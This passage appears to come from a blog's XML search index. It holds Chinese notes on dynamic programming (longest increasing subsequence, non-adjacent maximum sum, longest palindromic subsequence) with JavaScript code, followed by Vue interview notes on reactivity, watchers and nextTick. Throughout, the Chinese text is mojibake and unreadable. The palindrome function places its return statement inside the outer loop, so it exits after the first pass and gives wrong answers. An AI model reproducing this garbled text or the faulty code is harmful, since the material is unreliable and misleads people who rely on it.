O(n2)ã€‚è¿™ç§å°†é—®é¢˜è§„æ¨¡ä¸æ–­å‡å°‘çš„åšæ³•ï¼Œè¢«ç§°ä¸ºè‡ªé¡¶å‘ä¸‹çš„æ–¹æ³•ã€‚ä½†æ˜¯ï¼Œç”±äºŽæœ‰äº†é€’å½’çš„å­˜åœ¨ï¼Œç¨‹åºè¿è¡Œæ—¶å¯¹å †æ ˆçš„æ¶ˆè€—ä»¥åŠå¤„ç†æ˜¯å¾ˆæ…¢çš„ï¼Œåœ¨å®žé™…å·¥ä½œä¸­å¹¶ä¸æŽ¨èã€‚æ›´å¥½çš„åŠžæ³•æ˜¯è‡ªåº•å‘ä¸Šã€‚ æœ€é•¿å­åºåˆ—é—®é¢˜è‡ªåº•å‘ä¸Šçš„å®žçŽ°æ–¹å¼è‡ªåº•å‘ä¸ŠæŒ‡ï¼Œé€šè¿‡çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Œä»Žæœ€å°çš„é—®é¢˜è§„æ¨¡å…¥æ‰‹ï¼Œä¸æ–­åœ°å¢žåŠ é—®é¢˜è§„æ¨¡ï¼Œç›´åˆ°æ‰€è¦æ±‚çš„é—®é¢˜è§„æ¨¡ä¸ºæ­¢ã€‚ä¾ç„¶ä½¿ç”¨è®°å¿†åŒ–é¿å…é‡å¤çš„è®¡ç®—ï¼Œä¸éœ€è¦é€’å½’ã€‚ 123456789101112131415161718192021222324252627class LongestSubsequence &#123; constructor(nums) &#123; this.max = 1 // åˆå§‹åŒ– dp æ•°ç»„é‡Œçš„æ¯ä¸ªå…ƒç´ çš„å€¼ä¸º 1ï¼Œå³ä»¥æ¯ä¸ªå…ƒç´ ä½œä¸ºç»“å°¾çš„æœ€é•¿å­åºåˆ—çš„é•¿åº¦åˆå§‹åŒ–ä¸º 1 this.dp = new Array(nums.length).fill(1) this.init(nums) &#125; init(nums) &#123; let n = nums.length const &#123; dp &#125; = this // è‡ªåº•è€Œä¸Šæ±‚è§£æ¯ä¸ªå­é—®é¢˜çš„æœ€ä¼˜è§£ for (let i = 0; i &lt; n; i++) &#123; for (let j = 0; j &lt; i; j++) &#123; if (nums[j] &lt; nums[i] &amp;&amp; dp[i] &lt; dp[j] + 1) &#123; dp[i] = dp[j] + 1 &#125; &#125; // å½“å‰è®¡ç®—å¥½çš„é•¿åº¦ä¸Žå…¨å±€çš„æœ€å¤§å€¼è¿›è¡Œæ¯”è¾ƒ this.max = Math.max(this.max, dp[i]) &#125; &#125;&#125;const arr = [10, 9, 2, 5, 3, 7, 101, 18]const ls = new LongestSubsequence(arr)console.log('ls: ', ls.max) æœ€é•¿å­åºåˆ—é—®é¢˜è‡ªåº•å‘ä¸Šçš„å®žçŽ°æ–¹å¼æ—¶é—´å¤æ‚åº¦ç”±ä¸Šå¯çŸ¥ï¼Œè¿™ä¸€ä¸ªåŒé‡å¾ªçŽ¯ã€‚å½“ i=0 çš„æ—¶å€™ï¼Œå†…å¾ªçŽ¯æ‰§è¡Œ 0 æ¬¡ï¼›å½“ i=1 çš„æ—¶å€™ï¼Œå†…å¾ªçŽ¯æ‰§è¡Œ 1 æ¬¡â€¦â€¦ä»¥æ­¤ç±»æŽ¨ï¼Œå½“ i=nâˆ’1 çš„æ—¶å€™ï¼Œå†…å¾ªçŽ¯æ‰§è¡Œäº† nâˆ’1 æ¬¡ï¼Œå› æ­¤ï¼Œæ€»ä½“çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(1 + 2 + .. + nâˆ’1)=O(nÃ—(nâˆ’1) / 2)=O(n2)ã€‚ çº¿æ€§è§„åˆ’çº¿æ€§ï¼Œå°±æ˜¯è¯´å„ä¸ªå­é—®é¢˜çš„è§„æ¨¡ä»¥çº¿æ€§çš„æ–¹å¼åˆ†å¸ƒï¼Œå¹¶ä¸”å­é—®é¢˜çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æžœå¯ä»¥å­˜å‚¨åœ¨ä¸€ç»´çº¿æ€§çš„æ•°æ®ç»“æž„é‡Œï¼Œä¾‹å¦‚ä¸€ç»´æ•°ç»„ï¼Œå“ˆå¸Œè¡¨ç­‰ã€‚ è§£æ³•ä¸­ï¼Œç»å¸¸ä¼šç”¨ dp[i] åŽ»è¡¨ç¤ºç¬¬ i ä¸ªä½ç½®çš„ç»“æžœï¼Œæˆ–è€…ä»Ž 0 å¼€å§‹åˆ°ç¬¬ i ä¸ªä½ç½®ä¸ºæ­¢çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æžœã€‚ä¾‹å¦‚ï¼Œæœ€é•¿ä¸Šå‡å­åºåˆ—ã€‚dp[i] è¡¨ç¤ºä»Žæ•°ç»„ç¬¬ 0 ä¸ªå…ƒç´ å¼€å§‹åˆ°ç¬¬ i ä¸ªå…ƒç´ ä¸ºæ­¢çš„æœ€é•¿çš„ä¸Šå‡å­åºåˆ—ã€‚ æ±‚è§£ dp[i] çš„å¤æ‚ç¨‹åº¦å–å†³äºŽé¢˜ç›®çš„è¦æ±‚ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šæœ‰ä¸¤ç§å½¢å¼ã€‚ æ±‚ä¸ç›¸é‚»æ•°æœ€å¤§å’ŒLeetCode ç¬¬ 198 é¢˜ï¼Œç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œä¸èƒ½é€‰æ‹©ç›¸é‚»çš„æ•°ï¼Œæ±‚å¦‚ä½•é€‰æ‰èƒ½ä½¿æ€»æ•°æœ€å¤§ã€‚è§£æ³•ï¼šè¿™é“é¢˜éœ€è¦è¿ç”¨ç»å…¸çš„ 0-1 æ€æƒ³ï¼Œç®€å•è¯´å°±æ˜¯ï¼šâ€œé€‰è¿˜æ˜¯ä¸é€‰â€ã€‚ å‡è®¾ dp[i] è¡¨ç¤ºåˆ°ç¬¬ i ä¸ªå…ƒç´ ä¸ºæ­¢æˆ‘ä»¬æ‰€èƒ½æ”¶èŽ·åˆ°çš„æœ€å¤§æ€»æ•°ã€‚ å¦‚æžœé€‰æ‹©äº†ç¬¬ i ä¸ªæ•°ï¼Œåˆ™ä¸èƒ½é€‰å®ƒçš„å‰ä¸€ä¸ªæ•°ï¼Œå› æ­¤ï¼Œæ”¶èŽ·çš„æœ€å¤§æ€»æ•°å°±æ˜¯ dp[iâˆ’2] + nums[i]ã€‚ ä¸é€‰ï¼Œåˆ™ç›´æŽ¥è€ƒè™‘å®ƒçš„å‰ä¸€ä¸ªæ•° dp[iâˆ’1]ã€‚å› æ­¤ï¼Œå¯ä»¥æŽ¨å¯¼å‡ºå®ƒçš„é€’å½’å…¬å¼ dp[i]=max(nums[i] + dp[iâˆ’2], dp[iâˆ’1])ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œdp[i] ä»…ä»…ä¾èµ–äºŽæœ‰é™ä¸ª dp[j]ï¼Œå…¶ä¸­ j=iâˆ’1ï¼Œiâˆ’2ã€‚ æ±‚ä¸ç›¸é‚»æ•°æœ€å¤§å’Œä»£ç å®žçŽ°12345678910111213141516171819202122232425// æ±‚ä¸ç›¸é‚»æ•°æœ€å¤§å’Œconst rob = function (nums) &#123; let n = nums.length // å¤„ç†å½“æ•°ç»„ä¸ºç©ºæˆ–è€…æ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´ çš„æƒ…å†µ if (n === 0) return 0 if (n === 1) return nums[0] // å®šä¹‰ä¸€ä¸ª dp æ•°ç»„ï¼Œdp[i] è¡¨ç¤ºåˆ°ç¬¬ i ä¸ªå…ƒç´ ä¸ºæ­¢æˆ‘ä»¬èƒ½æ”¶èŽ·åˆ°çš„æœ€å¤§æ€»æ•° const dp = [] // åˆå§‹åŒ– dp[0], dp[1] dp[0] = nums[0] dp[1] = Math.max(nums[0], nums[1]) // å¯¹äºŽæ¯ä¸ª nums[i]ï¼Œè€ƒè™‘ä¸¤ç§æƒ…å†µï¼Œé€‰è¿˜æ˜¯ä¸é€‰ï¼Œç„¶åŽå–æœ€å¤§å€¼ for (let i = 2; i &lt; n; i++) &#123; dp[i] = Math.max(nums[i] + dp[i - 2], dp[i - 1]) &#125; return dp[n - 1]&#125;const arr = [10, 9, 2, 5, 3, 7, 101, 18]console.log('rb: ', rob(arr)) åŒºé—´è§„åˆ’åŒºé—´è§„åˆ’ï¼Œå°±æ˜¯è¯´å„ä¸ªå­é—®é¢˜çš„è§„æ¨¡ç”±ä¸åŒçš„åŒºé—´æ¥å®šä¹‰ï¼Œä¸€èˆ¬å­é—®é¢˜çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æžœå­˜å‚¨åœ¨äºŒç»´æ•°ç»„é‡Œã€‚ä¸€èˆ¬ç”¨ dp[i][j] ä»£è¡¨ä»Žç¬¬ i ä¸ªä½ç½®åˆ°ç¬¬ j ä¸ªä½ç½®ä¹‹é—´çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æžœã€‚ è§£è¿™ç±»é—®é¢˜çš„æ—¶é—´å¤æ‚åº¦ä¸€èˆ¬ä¸ºå¤šé¡¹å¼æ—¶é—´ï¼Œå¯¹äºŽä¸€ä¸ªå¤§å°ä¸º n çš„é—®é¢˜ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ä¼šè¶…è¿‡ n çš„å¤šé¡¹å¼å€æ•°ã€‚ä¾‹å¦‚ï¼ŒO(n)=n^kï¼Œk æ˜¯ä¸€ä¸ªå¸¸æ•°ï¼Œæ ¹æ®é¢˜ç›®çš„ä¸åŒè€Œå®šã€‚ æœ€é•¿å›žæ–‡é—®é¢˜LeetCode ç¬¬ 516 é¢˜ï¼Œåœ¨ä¸€ä¸ªå­—ç¬¦ä¸² S ä¸­æ±‚æœ€é•¿çš„å›žæ–‡å­åºåˆ—ã€‚ä¾‹å¦‚ç»™å®šå­—ç¬¦ä¸²ä¸º dccacï¼Œæœ€é•¿å›žæ–‡å°±æ˜¯ cccã€‚ æœ€é•¿å›žæ–‡é—®é¢˜è§£æ³•å¯¹äºŽå›žæ–‡æ¥è¯´ï¼Œå¿…é¡»ä¿è¯ä¸¤å¤´çš„å­—ç¬¦éƒ½ç›¸åŒã€‚ç”¨ dp[i][j] è¡¨ç¤ºä»Žå­—ç¬¦ä¸²ç¬¬ i ä¸ªå­—ç¬¦åˆ°ç¬¬ j ä¸ªå­—ç¬¦ä¹‹é—´çš„æœ€é•¿å›žæ–‡ï¼Œæ¯”è¾ƒè¿™æ®µåŒºé—´å¤–çš„ä¸¤ä¸ªå­—ç¬¦ï¼Œå¦‚æžœå‘çŽ°å®ƒä»¬ç›¸ç­‰ï¼Œå®ƒä»¬å°±è‚¯å®šèƒ½æž„æˆæ–°çš„æœ€é•¿å›žæ–‡ã€‚è€Œæœ€é•¿çš„å›žæ–‡é•¿åº¦ä¼šä¿å­˜åœ¨ dp[0][nâˆ’1] é‡Œã€‚å› æ­¤ï¼Œå¯ä»¥æŽ¨å¯¼å‡ºå¦‚ä¸‹çš„é€’æŽ¨å…¬å¼ã€‚å½“é¦–å°¾çš„ä¸¤ä¸ªå­—ç¬¦ç›¸ç­‰çš„æ—¶å€™ dp[0][nâˆ’1]=dp[1][nâˆ’2] + 2ï¼Œå¦åˆ™ï¼Œdp[0][nâˆ’1]=max(dp[1][nâˆ’1], dp[0][nâˆ’2])ã€‚ æœ€é•¿å›žæ–‡é—®é¢˜ä»£ç å®žçŽ°12345678910111213141516171819202122232425262728293031const LPS = function (s) &#123; let n = s.length // å®šä¹‰ dp çŸ©é˜µï¼Œ dp[i][j] è¡¨ç¤ºä»Žå­—ç¬¦ä¸²ç¬¬ i ä¸ªå­—ç¬¦ // åˆ°ç¬¬ j ä¸ªå­—ç¬¦ä¹‹é—´çš„æœ€å¤§å›žæ–‡ const dp = new Array(n) // åˆå§‹åŒ– dp çŸ©é˜µï¼Œå°†å¯¹è§’çº¿å…ƒç´ è®¾ä¸º 1ï¼Œå³å•ä¸ªå­—ç¬¦çš„å›žæ–‡é•¿åº¦ä¸º 1 for (let i = 0; i &lt; n; i++) &#123; dp[i] = [...new Array(n)] dp[i][i] = 1 &#125; console.log('dp: ', dp) // ä»Žé•¿åº¦ä¸º 2 å¼€å§‹ï¼Œå°è¯•å°†åŒºé—´æ‰©å¤§ï¼Œä¸€ç›´æ‰©å¤§åˆ° n for (let len = 2; len &lt;= n; len++) &#123; // æ‰©å¤§çš„è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡éƒ½å¾—å‡ºåŒºé—´çš„çœŸå®žä½ç½® i å’Œç»“æŸä½ç½®j for (let i = 0; i &lt; n - len + 1; i++) &#123; let j = i + len - 1 // æ¯”è¾ƒä¸€ä¸‹åŒºé—´é¦–å°¾çš„å­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æžœç›¸ç­‰ï¼Œå°±åŠ 2 // å¦‚æžœä¸ç­‰ï¼Œä»Žè§„æ¨¡æ›´å°çš„å­—ç¬¦ä¸²ä¸­å¾—å‡ºæœ€é•¿çš„å›žæ–‡é•¿åº¦ if (s.charAt(i) === s.charAt(j)) &#123; dp[i][j] = 2 + (len === 2 ? 0 : dp[i + 1][j - 1]) &#125; else &#123; dp[i][j] = Math.max(dp[i + 1][j], dp[i][j - 1]) &#125; &#125; return dp[0][n - 1] &#125;&#125;console.log(LPS('abcbc'))]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[inter-vue]]></title>
    <url>%2F2020%2F11%2F16%2Finter-vue%2F</url>
    <content type="text"><![CDATA[Vue å“åº”å¼åŽŸç†æ€Žä¹ˆå®žçŽ° å“åº”å¼æ ¸å¿ƒæ˜¯é€šè¿‡ Object.defineProperty æ‹¦æˆªå¯¹æ•°æ®çš„è®¿é—®å’Œè®¾ç½®ã€‚ å“åº”å¼æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼š å¯¹è±¡ã€‚å¾ªçŽ¯éåŽ†å¯¹è±¡çš„æ‰€æœ‰å±žæ€§ï¼Œä¸ºæ¯ä¸ªå±žæ€§è®¾ç½® getterã€setterï¼Œä»¥è¾¾åˆ°æ‹¦æˆªè®¿é—®å’Œè®¾ç½®çš„ç›®çš„ï¼Œå¦‚æžœå±žæ€§å€¼ä¾æ—§ä¸ºå¯¹è±¡ï¼Œåˆ™é€’å½’å±žæ€§å€¼ä¸Šçš„æ¯ä¸ª key è®¾ç½® getterã€setterã€‚ æ•°ç»„ã€‚å¢žå¼ºæ•°ç»„çš„é‚£ 7 ä¸ªï¼ˆpushã€popã€shiftã€unshiftã€spliceã€reverse å’Œ sortï¼‰å¯ä»¥æ”¹å˜è‡ªèº«çš„åŽŸåž‹æ–¹æ³•ï¼Œç„¶åŽæ‹¦æˆªå¯¹è¿™äº›æ–¹æ³•çš„æ“ä½œã€‚ è®¿é—®æ•°æ®æ—¶ï¼ˆobj.keyï¼‰è¿›è¡Œä¾èµ–æ”¶é›†ï¼Œåœ¨ dep ä¸­å­˜å‚¨ç›¸å…³çš„ watcherã€‚ è®¾ç½®æ•°æ®æ—¶ç”± dep é€šçŸ¥ç›¸å…³çš„ watcher åŽ»æ›´æ–°ã€‚ Vue ä¸­ MVVM åŽŸç† æ·±åº¦éåŽ† data å¯¹è±¡ï¼Œåˆ©ç”¨ defineProperty API å¯¹æ¯ä¸ªå±žæ€§æ•°æ®åŠ«æŒï¼ˆObserverï¼‰ å¯¹äºŽæ¯ä¸ªå±žæ€§çš„ getter ç»‘å®šä¸€ä¸ªä¾èµ–é˜Ÿåˆ—ï¼ˆDepï¼‰ï¼Œsetter è§¦å‘ï¼ˆNotifyï¼‰è¿™ä¸ªä¾èµ–é˜Ÿåˆ—éåŽ†æ‰§è¡Œæ¯ä¸€é¡¹ åœ¨æ¨¡ç‰ˆç¼–è¯‘æž„æˆä¸­ï¼Œç¼–è¯‘åˆ° v-modal æŒ‡ä»¤ã€è§£æžå‡ºå…·ä½“çš„æ–‡æœ¬èŠ‚ç‚¹å€¼æˆ–è€…ç”¨æˆ·æ‰‹åŠ¨ watcher æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªè§‚å¯Ÿè€…ï¼ˆWatcherï¼‰ï¼Œè§‚å¯Ÿè€…åˆ›å»ºåŽä¼šè°ƒç”¨ getter æ–¹æ³•ï¼Œå°†å…¶æ‰€æœ‰çš„ä¾èµ–çš„è§‚å¯Ÿå¯¹è±¡æ’å…¥å½“å‰ä¾èµ–é˜Ÿåˆ—ï¼ˆsubsï¼‰ã€‚ é€šè¿‡ç›‘å¬å…ƒç´ çš„ input äº‹ä»¶ï¼Œå½“ç”¨æˆ·è¾“å…¥å³å¯ä¿®æ”¹æ•°æ®ï¼Œè¿™æ ·å®žçŽ°äº†ä»Žè§†å›¾åˆ°æ•°æ®çš„æ›´æ–° å½“æ•°æ®å˜åŒ–ï¼Œè°ƒç”¨ setterï¼Œè§¦å‘éåŽ†æ‰§è¡Œä¾èµ–é˜Ÿåˆ—ä¸­çš„è§‚å¯Ÿè€…ï¼Œè§‚å¯Ÿè€…å›žè°ƒæ›´æ–°ï¼ˆupdateï¼‰è§†å›¾ï¼Œè¿™æ ·å°±å®žçŽ°äº†ä»Žæ•°æ®åˆ°è§†å›¾çš„æ›´æ–°ã€‚ Vue ä¸­ Dep &amp;&amp; Watcherä¸€ä¸ª obj.key å¯¹åº”ä¸€ä¸ª Depï¼Œå®ƒæ˜¯ç”¨æ¥æ”¶é›†å½“å‰ value æ‰€æœ‰ä¾èµ–ï¼Œä¾èµ–åˆ—è¡¨ï¼ˆdep.subsï¼‰ å­˜æ”¾æ‰€æœ‰ä¾èµ–çš„ watcher å®žä¾‹ã€‚ ä¸€ä¸ªç»„ä»¶å¯¹åº”ä¸€ä¸ª watcherï¼ˆæ¸²æŸ“ watcherï¼‰æˆ–è€…ä¸€ä¸ªè¡¨è¾¾å¼ watcherï¼ˆç”¨æˆ· watcherï¼‰ã€‚Watcher å¯¹ä¾èµ–ï¼ˆnewDepsï¼‰åŽ»é‡ï¼Œè®¾ç½®ä¾èµ–æ”¶é›†çš„å¼€å…³ï¼ˆDep.targetï¼‰ï¼Œè¿”å›žæ‰§è¡ŒèŽ·å–çš„å€¼ã€‚ å½“å‰å€¼å‘ç”Ÿæ”¹å˜æ—¶ï¼Œå°±ä¼šæ‰§è¡Œ setterï¼Œé€šçŸ¥ä¾èµ–å®žä¾‹ï¼ˆdepï¼‰è¿›è¡Œæ›´æ–°ï¼ˆnotifyï¼‰ï¼ŒéåŽ†ä¾èµ–åˆ—è¡¨ï¼ˆsubsï¼‰ä¸­çš„ watcher æ‰§è¡Œ updateã€‚ Vue ä¸­ nextTick åŽŸç†ç®€å•ï¼š åœ¨ä¸‹æ¬¡ DOM æ›´æ–°å¾ªçŽ¯ç»“æŸä¹‹åŽæ‰§è¡Œå»¶æ—¶å›žè°ƒã€‚nextTick ä¸»è¦ä½¿ç”¨äº†å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ã€‚æ ¹æ®æ‰§è¡ŒçŽ¯å¢ƒåˆ†åˆ«åŽ»å°è¯•é‡‡ç”¨ï¼š V2.6+ Promise MutationObserver setImmediate setTimeout V2.5 Promise setImmediate MessageChannel setTimeout å…·ä½“çš„ï¼š åœ¨æ•°æ®å˜åŒ–ï¼Œè§¦å‘è§‚å¯Ÿè€…ï¼ˆWatcherï¼‰å›žè°ƒï¼ˆupdateï¼‰æ—¶ï¼Œä¼šåˆ†ä¸ºä¸‰ç§æƒ…å†µï¼šèµ–å¤„ç†ï¼ˆlazyï¼‰ã€åŒæ­¥ï¼ˆsyncï¼‰å’Œ è§‚å¯Ÿè€…é˜Ÿåˆ—ï¼ˆqueueWatcherï¼‰ã€‚ è§‚å¯Ÿè€…é˜Ÿåˆ—é€šè¿‡è§‚å¯Ÿè€… id è¿›è¡ŒåŽ»é‡ï¼Œå†åŽ»é€šè¿‡ nextTick éåŽ†æ‰§è¡Œè§‚å¯Ÿè€…çš„ run å‡½æ•°è§†å›¾æ›´æ–°. nextTick æ‰§è¡Œçš„ç›®çš„æ˜¯åœ¨ microtask æˆ–è€… task ä¸­æŽ¨å…¥ä¸€ä¸ª functionï¼Œå½“å‰æ ˆæ‰§è¡Œå®Œæ¯•ä»¥åŽæ‰§è¡Œ nextTick ä¼ å…¥çš„ function. åœ¨ Vue2.5 ä¹‹åŽçš„ç‰ˆæœ¬ï¼ŒnextTick é‡‡å–çš„ç­–ç•¥é»˜è®¤èµ° microTaskï¼Œ å¯¹äºŽä¸€äº› DOM äº¤äº’ï¼Œå¦‚ v-on ç»‘å®šäº‹ä»¶å›žè°ƒå‡½æ•°çš„å¤„ç†ä¼šå¼ºåˆ¶èµ° macroTaskã€‚ åœ¨ Vue2.4 å‰åŸºäºŽ microTask å®žçŽ°ï¼Œä½†æ˜¯ microTask çš„æ‰§è¡Œçº§åˆ«éžå¸¸é«˜ï¼Œåœ¨æŸäº›åœºæ™¯ä¹‹ä¸‹ç”šè‡³æ¯”äº‹ä»¶å†’æ³¡è¿˜è¦å¿«ï¼Œä¼šå¯¼è‡´ä¸€äº›è¯¡å¼‚çš„é—®é¢˜ã€‚ä½†æ˜¯å…¨éƒ¨æ”¹æˆ macroTaskï¼Œå¯¹äºŽä¸€äº›æœ‰é‡ç»˜å’ŒåŠ¨ç”»åœºæ™¯ä¹Ÿä¼šæœ‰æ€§èƒ½å½±å“ã€‚ Vue ä¸­æ£€æµ‹å¯¹äºŽ macroTask æ”¯æŒé¡ºåºï¼š setImmediateï¼ˆé«˜ç‰ˆæœ¬ IE å’Œ Edgeï¼‰ -&gt; MessageChannel -&gt; setTimeoutã€‚ Vue ä¸­æ£€æµ‹å¯¹äºŽ microTask æ”¯æŒé¡ºåºï¼š Promise -&gt; fallback macroTaskã€‚ ç›¸å…³æ‹“å±•ï¼šmacroTask åŒ…æ‹¬ï¼šI/O -&gt; æ¸²æŸ“ -&gt; setImmediate -&gt; requestAnimationFrame -&gt; postMessage -&gt; setTimeout -&gt; setIntervalã€‚microTask åŒ…æ‹¬ï¼šprocess.nextTick -&gt; Promise -&gt; MutationObserve -&gt; Object.observe å‚è€ƒ:Vue ç•ªå¤–ç¯‡ â€“ vue.nextTick()æµ…æžJavaScript è¿è¡Œæœºåˆ¶è¯¦è§£ï¼šå†è°ˆ Event LoopVue.js å‡çº§è¸©å‘å°è®° è¿™é‡Œé»„æ¯…è€å¸ˆé‡åˆ°çš„éŸ³ä¹æ’­æ”¾è·Ÿæˆ‘é‡åˆ°çš„åœ¨çº¿å®¢æœæç¤ºéŸ³ä¹ä¸€æ ·çš„é—®é¢˜ï¼šnextTick å¼‚æ­¥è°ƒç”¨æ—¶ä½¿ç”¨ messageChannel API è¢«è®¤å®šä¸ºä¸æ˜¯ç”¨æˆ·è¡Œä¸ºï¼ŒéŸ³ä¹æ’­æ”¾å™¨ä¸ä¼šè¢«è°ƒç”¨ã€‚Tasks, microtasks, queues and schedules Vue åˆå§‹åŒ–è¿‡ç¨‹ï¼ˆnew Vue(options)ï¼‰éƒ½åšäº†ä»€ä¹ˆï¼Ÿ å¤„ç†ç»„å»ºé…ç½®é¡¹ã€‚ åˆå§‹åŒ–æ ¹ç»„ä»¶æ—¶è¿›è¡Œé€‰é¡¹åˆå¹¶æ“ä½œï¼Œå°†å…¨å±€é…ç½®åˆå¹¶åˆ°æ ¹ç»„ä»¶ã€‚ åˆå§‹åŒ–æ¯ä¸ªå­ç»„ä»¶æ—¶åšäº†ä¸€äº›æ€§èƒ½ä¼˜åŒ–ï¼Œå°†ç»„ä»¶é…ç½®å¯¹è±¡ä¸Šçš„ä¸€äº›æ·±å±‚æ¬¡å±žæ€§æ”¾åˆ° vm.$options é€‰é¡¹ä¸­ï¼Œä»¥æé«˜ä»£ç çš„æ‰§è¡Œæ•ˆçŽ‡ã€‚ åˆå§‹åŒ–ç»„ä»¶å®žä¾‹çš„å…³ç³»å±žæ€§ï¼Œæ¯”å¦‚ $parentã€$childrenã€$rootã€$refs ç­‰ã€‚ å¤„ç†è‡ªå®šä¹‰äº‹ä»¶ã€‚ å¤„ç†æ’æ§½ã€‚ è°ƒç”¨ beforeCreate é’©å­å‡½æ•°ã€‚ åˆå§‹åŒ–ç»„ä»¶çš„ inject é…ç½®é¡¹ï¼Œå¾—åˆ° ret[key]=val å½¢å¼çš„é…ç½®å¯¹è±¡ï¼Œç„¶åŽå¯¹è¯¥é…ç½®å¯¹è±¡è¿›è¡Œç›¸åº”å¤„ç†ï¼Œå¹¶ä»£ç†æ¯ä¸ª key åˆ° vm å®žä¾‹ä¸Šã€‚ æ•°æ®å“åº”å¼ï¼Œå¤„ç† propsã€methodsã€dataã€computedã€watch ç­‰é€‰é¡¹ã€‚ è§£æžç»„ä»¶é…ç½®é¡¹ä¸Šçš„ provide å¯¹è±¡ï¼Œå°†å…¶æŒ‚è½½åˆ° vm._provided å±žæ€§ä¸Šã€‚ è°ƒç”¨ created é’©å­å‡½æ•°ã€‚ å¦‚æžœå‘çŽ°é…ç½®é¡¹ä¸Šæœ‰ el é€‰é¡¹ï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨$mount æ–¹æ³•ï¼Œå¦åˆ™æ‰‹åŠ¨è°ƒç”¨$mountã€‚ æŽ¥ä¸‹æ¥è¿›å…¥æŒ‚è½½é˜¶æ®µã€‚ å‚è€ƒï¼šVue æºç è§£è¯»ï¼ˆ2ï¼‰â€”â€” Vue åˆå§‹åŒ–è¿‡ç¨‹ methodsã€computed å’Œ watch åŒºåˆ«ä½¿ç”¨åœºæ™¯ methods ä¸€èˆ¬ç”¨äºŽå°è£…ä¸€äº›è¾ƒä¸ºå¤æ‚çš„å¤„ç†é€»è¾‘ï¼ˆåŒæ­¥ã€å¼‚æ­¥ï¼‰ã€‚ computed ä¸€èˆ¬ç”¨äºŽå°è£…ç®€å•çš„åŒæ­¥é€»è¾‘ï¼Œå°†è®°è¿‡å¤„ç†çš„æ•°æ®è¿”å›žï¼Œç„¶åŽæ˜¾ç¤ºï¼Œå‡è½»æ¨¡ç‰ˆé‡é‡ã€‚ watch ä¸€èˆ¬ç”¨äºŽå½“éœ€è¦æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œå¼‚æ­¥æˆ–å¼€é”€è¾ƒå¤§çš„æ“ä½œã€‚ åŒºåˆ« methods æ¯æ¬¡æ‰§è¡Œéƒ½è°ƒç”¨ã€‚ computed ç¬¬ä¸€æ¬¡æ‰§è¡Œæ•°æ®è¢«ç¼“å­˜ï¼Œå®žçŽ°åŽŸç†å®ƒæœ¬è´¨æ˜¯ä¸€ä¸ª watcherï¼Œç¼“å­˜æ˜¯å› ä¸º watcher.dirty å±žæ€§æŽ§åˆ¶ã€‚ watch Watcher å¯¹è±¡çš„å®žä¾‹ã€‚ Vue çš„å¼‚æ­¥æ›´æ–°æœºåˆ¶æ˜¯å¦‚ä½•å®žçŽ°çš„ï¼ŸVue çš„å¼‚æ­¥æ›´æ–°æœºåˆ¶çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨æµè§ˆå™¨çš„å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—æ¥å®žçŽ°çš„ï¼Œé¦–é€‰å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå®ä»»åŠ¡é˜Ÿåˆ—æ¬¡ä¹‹ã€‚ å½“å“åº”å¼æ•°æ®æ›´æ–°åŽï¼Œä¼šè°ƒç”¨ dep.notify æ–¹æ³•ï¼Œé€šçŸ¥ dep ä¸­æ”¶é›†çš„ watcher åŽ»æ‰§è¡Œ update æ–¹æ³•ï¼Œwatcher.update å°† watcher è‡ªå·±æ”¾å…¥ä¸€ä¸ª watcher é˜Ÿåˆ—ï¼ˆå…¨å±€ queue æ•°ç»„ï¼‰ã€‚ ç„¶åŽé€šè¿‡ nextTick æ–¹æ³•å°†ä¸€ä¸ªåˆ·æ–° watcher é˜Ÿåˆ—çš„æ–¹æ³•ï¼ˆflushSchedulerQueueï¼‰æ”¾å…¥å…¨å±€çš„ callbacks æ•°ç»„ä¸­ã€‚ å¦‚æžœæ­¤æ—¶æµè§ˆå™¨çš„å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—ä¸­æ²¡æœ‰ä¸€ä¸ªå« flushCallbacks çš„å‡½æ•°ï¼Œåˆ™æ‰§è¡Œ timeFunc å‡½æ•°ï¼Œå°† flushCallbacks å‡½æ•°æ”¾å…¥å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—ã€‚å¦‚æžœå¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—ä¸­å·²ç»å­˜åœ¨ flushCallbacks å‡½æ•°ï¼Œç­‰å¾…å…¶æ‰§è¡Œå®Œæˆä»¥åŽå†æ”¾å…¥ä¸‹ä¸€ä¸ª flushCallbacks å‡½æ•°ã€‚ flushCallbacks å‡½æ•°è´Ÿè´£æ‰§è¡Œ callbacks æ•°ç»„ä¸­çš„æ‰€æœ‰ flushSchedulerQueue å‡½æ•°ã€‚ flushSchedulerQueue å‡½æ•°è´Ÿè´£åˆ·æ–° watcher é˜Ÿåˆ—ï¼Œå³æ‰§è¡Œ queue æ•°ç»„ä¸­æ¯ä¸€ä¸ª watcher çš„ run æ–¹æ³•ï¼Œä»Žè€Œè¿›å…¥æ›´æ–°é˜¶æ®µï¼Œæ¯”å¦‚æ‰§è¡Œç»„ä»¶æ›´æ–°å‡½æ•°æˆ–è€…æ‰§è¡Œç”¨æˆ· watch çš„å›žè°ƒå‡½æ•°ã€‚ nextTick -&gt; flushcallback -&gt; callbacks[flushSchedulerQueue] -&gt; [watcher] ä¸ºä»€ä¹ˆ Vue ä¸­ä¸è¦ç”¨ index ä½œä¸º keyï¼Ÿ sameNode 